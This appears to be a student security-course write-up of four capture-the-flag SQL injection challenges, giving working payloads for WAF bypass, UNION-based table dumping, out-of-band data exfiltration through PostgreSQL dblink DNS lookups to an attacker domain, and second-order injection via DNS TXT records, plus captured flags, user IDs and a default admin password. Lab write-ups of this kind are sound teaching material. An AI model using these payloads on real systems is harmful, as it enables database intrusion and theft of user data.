# EXTENDED BREAK 1

REDACTED (z0000000) and REDACTED (z0000000)

## moonshot.ext.ns.agency
flag{i_hope_you_learned_to_model_your_sql_queries_first_183b1aba-f8d3-4702-b7da-283e4ed75226}
### Description
There is a SQL injection vulnerability on the query field on the form, however it is 'protected' by a Web Application Firewall (WAF). The WAF protects the web application by the following:

* Banned inputs include:
    - space
    - '
    - 1 or 0
    - flag
    - \' (doesnt work)
    - SQL keywords
        - The WAF is not case sensitive and since sql query are case insensitive, we can use that to our advantage.
* Permanent IP Banning
    * Any attempt to inject SQL that is detected results in the offending IP address being banned.

### Exploitation
We started by testing which characters were banned. Once we had a good idea of the banned chars/words, we started looking for ways to bypass those.

We found ways to bypass the WAF:
* space
    - "/\*\*/" comments get converted to single spaces when the query is executed
* SQL keywords
     - we combined uppercase and lowercase in the keywords. For example, "SeLeCt" instead of "select".
* 1 or 0
    - We bypassed this but using any number apart from 1 or 0 e.g. 2
    - When we needed to get 1 (e.g. `OFFSET 1`), we used calculations such as (3-2)
* '
    * we did not need the '
    * To type strings we could have used hex
* The word 'flag'
    - This was overcome by mixing the case of the word e.g. `fLaG`

By inputting nothing, we can create an error and get the following query:
`SELECT garbage, fuckyou from garbage where id<injection happens here>`

Additionally, only 1 row is returned.

By using the bypasses mentionned above we can start by dumping all table names.

The query looks like:
`200/**/uNIon/**/(sElect/**/table_name,Null/**/fRom/**/information_schema.tables/**/LiMiT/**/(3-2)/**/OfFsEt/**/(3-3))`

By incrementing the offset we find multiple tables of interest including:
- `ip_address`
- `flag`

We can now list all the columns of the flag table.

`200/**/uNIon/**/(sElect/**/column_name,NuLL/**/fRom/**/information_schema.columns/**/wHere/**/table_name='flag'`

But we're not allowed to type `'flag'` because of the flag so we have to find a different way.

Our previous query will return the 'flag' row with the correct offset as such:

`sElect/**/table_name/**/fRom/**/information_schema.tables/**/LiMiT/**/(3-2)/**/OfFsEt/**/(4-2)`

We can then craft a query to get all the columns of the flag table:

`200/**/uNIon/**/(sElect/**/column_name,NuLL/**/fRom/**/information_schema.columns/**/wHere/**/table_name=(sElect/**/table_name/**/fRom/**/information_schema.tables/**/LiMiT/**/(3-2)/**/OfFsEt/**/(4-2)))`

The table columns include:
- time
- garbage
- flag

At that point we can start dumping the column of interest, in this case the `flag` column. And by running the following, we get the flag.

`200/**/uNIon/**/(sElect/**/FlAG,NulL/**/fRom/**/fLaG)`

### Severity
The severity of this vulnerability is high as even though the amount of data that is retrievable is limited to 1 row at a time, a patient hacker can still, over time, collect the data but nevertheless, the fact that the any arbitrary table can be viewed essentially reveals all the data in the database to the world, from sensitive data to user data such as logins and passwords.

## oobydooby.ext.ns.agency
COMP6843{a14f589c-9b86-4f98-8160-454c588e108f}
### Description
The url "http://oobydooby.ext.ns.agency/query" contains a form which is vulnerable to sql injection.

By setting the query to `'` we get the following error:
```
error occured in the query
raw query: SELECT id, name, surname, address, postcode, cats_name,
mothers_maiden_name, gender, time_created
                                        FROM person
                                        WHERE name
                                        LIKE '%'%'
                                        LIMIT 500
```
By typing `a` as the query, we can see that the output only tells us if there is a result or not:
        - `results found. but not telling you :)`
        - `No results found`

In these cases the query ran successfully and we can use these error messages to make sure our query is being executed.

### Exploitation
We start by fingerprinting the domain.

`' or surname = CONCAT('a','b') -- ` is a valid query therefore it must be either mysql or Oracle or Postgresql.

`' or surname =  'a' || 'b' -- ` is a valid query therefore it must be Oracle or Postgresql.

`1' AND 1=1::int -- ` is a valid query therefore it must be Postgresql.

Now that we know what dbms is being used, we need to find an alternative way to extract information from it.

In this case, we can use out of band sql injection through dns requests.

In PostgreSQL, this equates to using a query that tries to connect to another PostgreSQL database as such:
```
SELECT dblink_connect('my_conn', 'host=my-awesome-domain.com user=someuser
dbname=somedb password=postgres')
```
where `my-awesome-domain.com` is the domain we're listening for DNS requests on.

To extract information, we will query our domain with a subdomain set to the information we want to extract as such:
    - `my-information-to-extract.my-awesome-domain.com`
    and our listening server will see something along the lines of:
```
04:07:01.735406 IP 172.172.172.172.21738 > 172.172.172.172.domain: 2711 [1au]
A? my-information-to-extract.my-awesome-domain.com. (65)
```

Therefore, we can extract all the tables from information_schema with a query like this:
```
' and 1=0 UNION (SELECT id, (SELECT dblink_connect('my_conn', 'host=' ||
(select table_name from information_schema.tables as p
where p.table_schema != 'information_schema'
and p.table_schema != 'pg_catalog' limit 1 offset 0)
|| '.oob.domain.com user=someuser  dbname=somedb password=postgres')), surname,
address, postcode, cats_name, mothers_maiden_name, gender, time_created
FROM person WHERE 1=1) --
```
We then simply increment the offset to get all the tables. These include:
    - `person`
    - `flag`

Similarly for the columns in the flag table:
```
' and 1=0 UNION (SELECT id, (SELECT dblink_connect('my_conn', 'host=' ||
(select flag from flag limit 1) || '.oob.domain.com user=someuser  
dbname=somedb password=postgres')), surname, address, postcode, cats_name,
mothers_maiden_name, gender, time_created FROM person WHERE 1=1) --
```
The columns include:
    - `id`
    - `flag`

At this point we can get what we're searching for, the flag itself:
```
' and 1=0 UNION (SELECT id, (SELECT dblink_connect('my_conn', 'host=' ||
(select flag from flag where flag like 'COMP%') || '.oob.domain.com user=someuser
dbname=somedb password=postgres')), surname, address, postcode, cats_name,
mothers_maiden_name, gender, time_created
FROM person WHERE 1=1) --
```

And the DNS listener on our server gives us the flag:
```
06:15:42.192130 IP ec2-13-54-223-207.ap-southeast-2.compute.amazonaws.com.36635
> 172.172.172.172.domain: 17659% [1au] A?
COMP6843{a14f589c-9b86-4f98-8160-454c588e108f}.oob.domain.com. (86)
```

### Severity
The severity of this vulnerability is high as even though we cannot get the information directly on the site, by leveraging DNS via an Out of Band Injection, an attacker can collect the data by retrieving it through DNS requests. The fact that the any arbitrary table can be viewed essentially reveals all the data in the database to the world, from sensitive data to user data such as logins and passwords.

## slowpoke.ext.ns.agency
COMP6843{e65e9af7-704a-4acd-944c-d67cb8dc3442}
### Description
The vulnerability in `slowpoke.ext.ns.agency` is in the search field under the `query` subdirectory, found on the "challenge" link, with the search field vulnerable to SQL injection, confirmed with simply entering an `'` into it, producing an error (hence an error based injection). However there are two catches:
* Queries made against it are slow greatly decreasing retry times.
* The amount of rows returned are limited to 500 and so a simple `' OR '1'='1` will produce too many results, causing the application to not return the results.

### Exploitation
Through the error based injection, the following query is:
```
"SELECT id, name, surname, address, postcode, cats_name,
mothers_maiden_name, gender, time_created
FROM person
WHERE nameLIKE '%%%%'
LIMIT 500;"
```
The injection occurs between the `%%%%`. The solution would be:
* To return NO rows from the normal query to not break the 500 row limit.
* Use a `UNION` to the query to reveal any information from `INFORMATION_SCHEMA.TABLES` if possible (Rinse and repeat for different database versions if necessary). A sample payload is as follows:
```
' AND 1=2 UNION SELECT NULL, NULL, table_name, NULL,
NULL, NULL, NULL, NULL, NULL
FROM information_schema.tables
WHERE table_schema NOT IN ('information_schema',
'pg_catalog') AND table_name LIKE '
```
NOTE: The above is actually one line.
* Running such a payload would reveal two tables `flag` and `person`. We can adjust the query to reveal `column_name` from `information_schema.columns` for any table (most likely `flag` in our case) which reveals the most likely column `flag`. Finally, we replace the `information_schema` query with a query to get `select flag from flag`, padding in the other columns to match the union. This produces the flag. Final payload is as below (NOTE: It is actually entered in one line):
```
' AND 1=2 UNION SELECT NULL, NULL, flag, NULL, NULL, NULL,
NULL, NULL, NULL FROM flag WHERE flag LIKE '%COMP
```

### Severity
The severity of this vulnerability is quite high as it is possible to exfiltrate data from virtually every data table (although hindered by the speed of the query but this limitation is circumventable), including not only sensitive data but user tables which will likely contain usernames and password hashes and potentially salts.



## sso.ns.agency
COMP6443{0ffcaf65-e80d-4295-a516-451962831f92}
### Description
The application has a in-house dns system which allows a user to add entries for their own ip to dns record. The records can be viewed and modified from `dns.sso.ns.agency`.

By logging in to the application we can see that a request for the dns records of our ip address was made.

Using the dns system, we can redirect our ip to a ip/domain of our choice.

By adding a TXT record to the domain we redirect to, we can test for any potential injections such as sql or xss when the application queries the system or attempts to display the contents of our domain.

By setting up a redirect for our ip to a domain we own and adding a TXT record to that domain with the content as `'`, we get an error when attempting to reset our password:
```
update users set reset_details='Error obtaining A for new.domain.com\n
    Error obtaining NS for new.domain.com\n
    Error obtaining MX for new.domain.com\n
    '', last_reset=%s, reset_actor=%s where email=%s"] \
    [parameters: (datetime.datetime(2019, 3, 12, 10, 9, 53, 495939), \
    '60.227.92.178', 'z5016776@cse.unsw.edu.au')
```
This means we have an sql injection and can use it to extract data.

### Exploitation
In order to exploit this vulnerability, we can set the TXT records to our sqli payload.
We first get the table names by setting our TXT record to:
```
'; update users set reset_details=(SELECT array_to_string(array
(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES as p
where p.table_schema != 'information_schema' and
p.table_schema != 'pg_catalog'),', ')) --
```
NOTE: The above is entered in one line.

This returns the following tables : `users, dns`.

From the login page's error message, we know that we're after the login details of an admin user : `No login, no flag`.

We dump the columns of the users table using the following:
```
'; update users set reset_details=(SELECT array_to_string(array
(SELECT column_name FROM INFORMATION_SCHEMA.columns
where table_name='users'),', ')) --
```
This returns the following columns `zid, email, password, last_reset, reset_actor, reset_details`.

We then list all the user ids using:
```
'; update users set reset_details=(SELECT array_to_string(array
(SELECT zid FROM users),', ')) --
```
This returns:
```
3294734, 3417083, 3459006, 3460832, 3462444, 3462862,
3521091, 5015215, 5016776, 5017255, 5019242, 5019271,
5019320, 5019336, 5019729, 5024969, 5025019, 5025142,
5025193, 5045865, 5057526, 5059342, 5059449, 5059671,
5059760, 5059799, 5061216, 5061266, 5061444, 5062127,
5075149, 5075397, 5075792, 5075830, 5075845, 5076219,
5080331, 5087077, 5092145, 5092151, 5098151, 5098918,
5098972, 5100899, 5102072, 5112669, 5112732, 5113067,
5113176, 5113415, 5114473, 5115412, 5115423, 5115566,
5115744, 5115782, 5116019, 5116054, 5116286, 5118046,
5118072, 5118740, 5119619, 5119752, 5120492, 5121750,
5122536, 5127215, 5128179, 5136212, 5137455, 5138074,
5139834, 5141364, 5142286, 5142642, 5142853, 5148077,
5155096, 5159918, 5160384, 5160405, 5160624, 5161105,
5161185, 5161631, 5161933, 5163491, 5163989, 5164500,
5164514, 5165167, 5165390, 5166082, 5168147, 5180332,
5205927, 5206624, 5214048, 5231006, 5231521, 5246489,
9447944, 9700463
```

We notice the last 2 zid are very different to all the others: `9447944` and `9700463`.

By login in with to the zid : `9447944` with password `DEFAULT_PASSWORD` we get the flag.

### Severity
The severity of this vulnerability is quite high as it is possible to gain access to not only the users but potentially we can use it to list anything in the database.
